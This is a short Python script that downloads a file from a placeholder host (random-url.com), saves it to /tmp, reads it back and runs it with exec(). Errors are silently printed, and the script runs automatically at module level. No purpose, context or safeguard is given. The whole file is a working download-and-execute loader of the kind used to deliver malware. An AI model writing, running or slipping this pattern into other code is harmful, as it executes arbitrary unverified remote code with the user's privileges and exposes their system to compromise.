import requests

def download_code(random_url):
    response = requests.get(random_url)
    return response.text

def write_to_file(file_path, content):
    with open(file_path, "w") as f:
        f.write(content)

def read_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def execute_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    url = "http://random-url.com/random-code.py"
    file_path = "/tmp/random-code.py"

    code = download_code(url)
    write_to_file(file_path, code)

    code_to_execute = read_from_file(file_path)
    execute_code(code_to_execute)

main()
